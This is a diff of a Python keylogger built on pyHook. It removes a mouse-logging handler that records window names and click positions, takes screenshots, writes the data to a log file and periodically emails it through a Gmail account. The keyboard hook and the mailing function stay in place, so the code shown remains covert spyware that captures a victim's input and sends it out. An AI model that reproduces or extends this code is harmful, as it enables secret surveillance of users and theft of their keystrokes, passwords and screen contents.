@@ -67,32 +67,6 @@ def Mail_it(data, pics_names):
         server.close()
 
 
-def OnMouseEvent(event):
-    global yourgmail, yourgmailpass, sendto, interval
-    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
-        + ' WindowName : ' + str(event.WindowName)
-    data += '\n\tButton:' + str(event.MessageName)
-    data += '\n\tClicked in (Position):' + str(event.Position)
-    data += '\n===================='
-    global t, start_time, pics_names
-
-    t = t + data
-
-    if len(t) > 300:
-        ScreenShot()
-
-    if len(t) > 500:
-        f = open('Logfile.txt', 'a')
-        f.write(t)
-        f.close()
-        t = ''
-
-    if int(time.time() - start_time) == int(interval):
-        Mail_it(t, pics_names)
-        start_time = time.time()
-        t = ''
-
-    return True
 
 
 def OnKeyboardEvent(event):
@@ -121,11 +95,9 @@ hook = pyHook.HookManager()
 
 hook.KeyDown = OnKeyboardEvent
 
-hook.MouseAllButtonsDown = OnMouseEvent
 
 hook.HookKeyboard()
 
-hook.HookMouse()
 
 start_time = time.time()
 
